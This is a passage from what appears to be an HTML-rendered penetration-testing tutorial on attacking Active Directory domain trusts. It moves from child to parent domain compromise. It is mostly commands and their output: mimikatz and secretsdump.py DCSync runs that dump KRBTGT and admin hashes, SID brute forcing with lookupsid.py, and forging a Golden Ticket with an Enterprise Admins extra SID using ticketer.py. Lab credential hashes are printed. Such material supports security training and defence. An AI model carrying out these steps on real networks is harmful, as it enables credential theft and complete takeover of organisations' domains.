+</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a><span class="n">Object</span> <span class="n">Security</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3842939050</span><span class="p">-</span><span class="n">3880317879</span><span class="p">-</span><span class="n">2865463114</span><span class="p">-</span><span class="n">1001</span>
+</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a><span class="n">Object</span> <span class="n">Relative</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">1001</span>
+</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>
+</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a><span class="n">Credentials</span><span class="p">:</span>
+</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>  <span class="n">Hash</span> <span class="n">NTLM</span><span class="p">:</span> <span class="n">663715a1a8b957e8e9943cc98ea451b6</span>
+</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>    <span class="n">ntlm</span><span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">663715a1a8b957e8e9943cc98ea451b6</span>
+</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>    <span class="n">ntlm</span><span class="p">-</span> <span class="n">1</span><span class="p">:</span> <span class="n">663715a1a8b957e8e9943cc98ea451b6</span>
+</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>    <span class="n">lm</span>  <span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">6053227db44e996fe16b107d9d1e95a0</span>
+</span></code></pre></div>
+<p>When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">mimikatz</span> <span class="c"># lsadump::dcsync /user:TRUSTED\lab_adm /domain:TRUSTED.LOCAL</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="no">[DC]</span> <span class="s1">&#39;TRUSTED.LOCAL&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">domain</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="no">[DC]</span> <span class="s1">&#39;DC01.TRUSTED.LOCAL&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">DC</span> <span class="n">server</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="no">[DC]</span> <span class="s1">&#39;TRUSTED\lab_adm&#39;</span> <span class="n">will</span> <span class="n">be</span> <span class="n">the</span> <span class="n">user</span> <span class="n">account</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="no">[rpc]</span> <span class="n">Service</span>  <span class="p">:</span> <span class="n">ldap</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="no">[rpc]</span> <span class="n">AuthnSvc</span> <span class="p">:</span> <span class="n">GSS_NEGOTIATE</span> <span class="p">(</span><span class="n">9</span><span class="p">)</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="n">Object</span> <span class="n">RDN</span>           <span class="p">:</span> <span class="n">lab_adm</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="p">**</span> <span class="n">SAM</span> <span class="n">ACCOUNT</span> <span class="p">**</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="n">SAM</span> <span class="n">Username</span>         <span class="p">:</span> <span class="n">lab_adm</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="n">Account</span> <span class="nb">Type </span>        <span class="p">:</span> <span class="n">30000000</span> <span class="p">(</span> <span class="n">USER_OBJECT</span> <span class="p">)</span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="n">User</span> <span class="n">Account</span> <span class="n">Control</span> <span class="p">:</span> <span class="n">00010200</span> <span class="p">(</span> <span class="n">NORMAL_ACCOUNT</span> <span class="n">DONT_EXPIRE_PASSWD</span> <span class="p">)</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="n">Account</span> <span class="n">expiration</span>   <span class="p">:</span>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="n">Password</span> <span class="n">last</span> <span class="n">change</span> <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">27</span><span class="p">/</span><span class="n">2022</span> <span class="n">10</span><span class="p">:</span><span class="n">53</span><span class="p">:</span><span class="n">21</span> <span class="n">PM</span>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="n">Object</span> <span class="n">Security</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3842939050</span><span class="p">-</span><span class="n">3880317879</span><span class="p">-</span><span class="n">2865463114</span><span class="p">-</span><span class="n">1001</span>
+</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="n">Object</span> <span class="n">Relative</span> <span class="n">ID</span>   <span class="p">:</span> <span class="n">1001</span>
+</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>
+</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="n">Credentials</span><span class="p">:</span>
+</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a>  <span class="n">Hash</span> <span class="n">NTLM</span><span class="p">:</span> <span class="n">663715a1a8b957e8e9943cc98ea451b6</span>
+</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a>    <span class="n">ntlm</span><span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">663715a1a8b957e8e9943cc98ea451b6</span>
+</span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a>    <span class="n">ntlm</span><span class="p">-</span> <span class="n">1</span><span class="p">:</span> <span class="n">663715a1a8b957e8e9943cc98ea451b6</span>
+</span><span id="__span-10-25"><a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a>    <span class="n">lm</span>  <span class="p">-</span> <span class="n">0</span><span class="p">:</span> <span class="n">6053227db44e996fe16b107d9d1e95a0</span>
+</span></code></pre></div>
+<p>We could also run the command specifying the <code>ticket.kirbi</code> file:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">PS</span><span class="p">:\&gt;</span> <span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;kerberos::ptt ticket.kirbi&quot;</span> <span class="s2">&quot;lsadump::dcsync /user:TRUSTED\lab_adm /domain:TRUSTED.LOCAL&quot;</span> <span class="s2">&quot;exit&quot;</span>
+</span></code></pre></div>
+<p>Now that we've walked through child --&gt; parent domain compromise from a Windows attack box, we'll cover a few ways to achieve the same if we are constrained to a Linux attack host.</p>
+<h2 id="extrasids-attack-linux">ExtraSids Attack - Linux</h2>
+<p>We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:</p>
+<ul>
+<li>The KRBTGT hash for the child domain</li>
+<li>The SID for the child domain</li>
+<li>The name of a target user in the child domain (does not need to exist!)</li>
+<li>The FQDN of the child domain</li>
+<li>The SID of the Enterprise Admins group of the root domain</li>
+</ul>
+<p>Once we have complete control of the child domain, <code>INTERNAL.TRUSTED.LOCAL</code>, we can use <code>secretsdump.py</code> to DCSync and grab the NTLM hash for the KRBTGT account.</p>
+<h3 id="performing-dcsync-with-secretsdumppy">Performing DCSync with secretsdump.py</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>❯<span class="w"> </span>secretsdump.py<span class="w"> </span>internal.trusted.local/Administrator@172.16.5.240<span class="w"> </span>-just-dc-user<span class="w"> </span>INTERNAL/krbtgt
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Impacket<span class="w"> </span>v0.9.25.dev1+20220311.121550.1271d369<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>Password:
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>the<span class="w"> </span>DRSUAPI<span class="w"> </span>method<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>NTDS.DIT<span class="w"> </span>secrets
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Kerberos<span class="w"> </span>keys<span class="w"> </span>grabbed
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>krbtgt:des-cbc-md5:fee04c3d026d7538
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up...
+</span></code></pre></div>
+<p>Next, we can use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py">lookupsid.py</a> from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format <code>DOMAIN_SID-RID</code>. For example, from the output below, we can see that the SID of the <code>lab_adm</code> user would be <code>S-1-5-21-2806153819-209893948-922872689-1001</code>.</p>
+<h3 id="performing-sid-brute-forcing-using-lookupsidpy">Performing SID Brute Forcing using lookupsid.py</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>❯<span class="w"> </span>lookupsid.py<span class="w"> </span>internal.trusted.local/Administrator@172.16.5.240<span class="w"> </span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Impacket<span class="w"> </span>v0.9.24.dev1+20211013.152215.3fe2d73a<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>Password:
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Brute<span class="w"> </span>forcing<span class="w"> </span>SIDs<span class="w"> </span>at<span class="w"> </span><span class="m">172</span>.16.5.240
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>StringBinding<span class="w"> </span>ncacn_np:172.16.5.240<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\l</span>sarpc<span class="o">]</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>SID<span class="w"> </span>is:<span class="w"> </span>S-1-5-21-2806153819-209893948-922872689
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="m">500</span>:<span class="w"> </span>INTERNAL<span class="se">\A</span>dministrator<span class="w"> </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="m">501</span>:<span class="w"> </span>INTERNAL<span class="se">\G</span>uest<span class="w"> </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="m">502</span>:<span class="w"> </span>INTERNAL<span class="se">\k</span>rbtgt<span class="w"> </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="m">512</span>:<span class="w"> </span>INTERNAL<span class="se">\D</span>omain<span class="w"> </span>Admins<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="m">513</span>:<span class="w"> </span>INTERNAL<span class="se">\D</span>omain<span class="w"> </span>Users<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="m">514</span>:<span class="w"> </span>INTERNAL<span class="se">\D</span>omain<span class="w"> </span>Guests<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="m">515</span>:<span class="w"> </span>INTERNAL<span class="se">\D</span>omain<span class="w"> </span>Computers<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a><span class="m">516</span>:<span class="w"> </span>INTERNAL<span class="se">\D</span>omain<span class="w"> </span>Controllers<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="m">517</span>:<span class="w"> </span>INTERNAL<span class="se">\C</span>ert<span class="w"> </span>Publishers<span class="w"> </span><span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a><span class="m">520</span>:<span class="w"> </span>INTERNAL<span class="se">\G</span>roup<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a><span class="m">521</span>:<span class="w"> </span>INTERNAL<span class="se">\R</span>ead-only<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-20"><a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a><span class="m">522</span>:<span class="w"> </span>INTERNAL<span class="se">\C</span>loneable<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-21"><a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="m">525</span>:<span class="w"> </span>INTERNAL<span class="se">\P</span>rotected<span class="w"> </span>Users<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-22"><a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a><span class="m">526</span>:<span class="w"> </span>INTERNAL<span class="se">\K</span>ey<span class="w"> </span>Admins<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-23"><a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="m">553</span>:<span class="w"> </span>INTERNAL<span class="se">\R</span>AS<span class="w"> </span>and<span class="w"> </span>IAS<span class="w"> </span>Servers<span class="w"> </span><span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span><span id="__span-13-24"><a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="m">571</span>:<span class="w"> </span>INTERNAL<span class="se">\A</span>llowed<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="w"> </span><span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span><span id="__span-13-25"><a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a><span class="m">572</span>:<span class="w"> </span>INTERNAL<span class="se">\D</span>enied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group<span class="w"> </span><span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span><span id="__span-13-26"><a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="m">1001</span>:<span class="w"> </span>INTERNAL<span class="se">\l</span>ab_adm<span class="w"> </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span><span id="__span-13-27"><a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="m">1002</span>:<span class="w"> </span>INTERNAL<span class="se">\D</span>C02$<span class="w"> </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span><span id="__span-13-28"><a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a><span class="m">1103</span>:<span class="w"> </span>INTERNAL<span class="se">\D</span>nsAdmins<span class="w"> </span><span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span><span id="__span-13-29"><a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a><span class="m">1104</span>:<span class="w"> </span>INTERNAL<span class="se">\D</span>nsUpdateProxy<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-13-30"><a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a><span class="m">1105</span>:<span class="w"> </span>INTERNAL<span class="se">\T</span>RUSTED$<span class="w"> </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span></code></pre></div>
+<p>We can filter out the noise by piping the command output to grep and looking for just the domain SID.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>❯<span class="w"> </span>lookupsid.py<span class="w"> </span>internal.trusted.local/Administrator@172.16.5.240<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;Domain SID&quot;</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Password:
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>SID<span class="w"> </span>is:<span class="w"> </span>S-1-5-21-2806153819-209893948-92287268
+</span></code></pre></div>
+<p>Next, we can rerun the command, targeting the TRUSTED Domain Controller (DC01) at 172.16.5.5 and grab the domain <code>SID S-1-5-21-3842939050-3880317879-2865463114</code> and attach the RID of the Enterprise Admins group. <a href="https://adsecurity.org/?p=1001">Here</a> is a handy list of well-known SIDs.</p>
+<h3 id="grabbing-the-domain-sid-attaching-to-enterprise-admins-rid">Grabbing the Domain SID &amp; Attaching to Enterprise Admin's RID</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>❯<span class="w"> </span>lookupsid.py<span class="w"> </span>internal.trusted.local/Administrator@172.16.5.5<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-B12<span class="w"> </span><span class="s2">&quot;Enterprise Admins&quot;</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>Password:
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>SID<span class="w"> </span>is:<span class="w"> </span>S-1-5-21-3842939050-3880317879-2865463114
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="m">498</span>:<span class="w"> </span>TRUSTED<span class="se">\E</span>nterprise<span class="w"> </span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="m">500</span>:<span class="w"> </span>TRUSTED<span class="se">\a</span>dministrator<span class="w"> </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="m">501</span>:<span class="w"> </span>TRUSTED<span class="se">\g</span>uest<span class="w"> </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="m">502</span>:<span class="w"> </span>TRUSTED<span class="se">\k</span>rbtgt<span class="w"> </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="m">512</span>:<span class="w"> </span>TRUSTED<span class="se">\D</span>omain<span class="w"> </span>Admins<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="m">513</span>:<span class="w"> </span>TRUSTED<span class="se">\D</span>omain<span class="w"> </span>Users<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="m">514</span>:<span class="w"> </span>TRUSTED<span class="se">\D</span>omain<span class="w"> </span>Guests<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="m">515</span>:<span class="w"> </span>TRUSTED<span class="se">\D</span>omain<span class="w"> </span>Computers<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="m">516</span>:<span class="w"> </span>TRUSTED<span class="se">\D</span>omain<span class="w"> </span>Controllers<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="m">517</span>:<span class="w"> </span>TRUSTED<span class="se">\C</span>ert<span class="w"> </span>Publishers<span class="w"> </span><span class="o">(</span>SidTypeAlias<span class="o">)</span>
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="m">518</span>:<span class="w"> </span>TRUSTED<span class="se">\S</span>chema<span class="w"> </span>Admins<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="m">519</span>:<span class="w"> </span>TRUSTED<span class="se">\E</span>nterprise<span class="w"> </span>Admins<span class="w"> </span><span class="o">(</span>SidTypeGroup<span class="o">)</span>
+</span></code></pre></div>
+<p>We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user <code>hacker</code> to forge our Golden Ticket.</p>
+<ul>
+<li>The KRBTGT hash for the child domain: <code>9d765b482771505cbe97411065964d5f</code></li>
+<li>The SID for the child domain: <code>S-1-5-21-2806153819-209893948-922872689</code></li>
+<li>The name of a target user in the child domain (does not need to exist!): <code>hacker</code></li>
+<li>The FQDN of the child domain: <code>INTERNAL.TRUSTED.LOCAL</code></li>
+<li>The SID of the Enterprise Admins group of the root domain: <code>S-1-5-21-3842939050-3880317879-2865463114-519</code></li>
+</ul>
+<p>Next, we can use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py">ticketer.py</a> from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by <code>-domain-sid</code>) and the parent domain (specified by <code>-extra-sid</code>).</p>
+<h3 id="constructing-a-golden-ticket-using-ticketerpy">Constructing a Golden Ticket using ticketer.py</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>❯<span class="w"> </span>ticketer.py<span class="w"> </span>-aesKey<span class="w"> </span>&lt;krbtgt<span class="w"> </span>aesKey&gt;<span class="w"> </span>or<span class="w"> </span>-nthash<span class="w"> </span>&lt;HASH&gt;<span class="w"> </span>-domain-sid<span class="w"> </span>&lt;child-sid&gt;<span class="w"> </span>-domain<span class="w"> </span>&lt;child-domain&gt;<span class="w"> </span>-extra-sid<span class="w"> </span>&lt;parent-sid&gt;-519<span class="w"> </span>&lt;target-user&gt;
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>❯<span class="w"> </span>ticketer.py<span class="w"> </span>-nthash<span class="w"> </span>9d765b482771505cbe97411065964d5f<span class="w"> </span>-domain<span class="w"> </span>INTERNAL.TRUSTED.LOCAL<span class="w"> </span>-domain-sid<span class="w"> </span>S-1-5-21-2806153819-209893948-922872689<span class="w"> </span>-extra-sid<span class="w"> </span>S-1-5-21-3842939050-3880317879-2865463114-519<span class="w"> </span>hacker
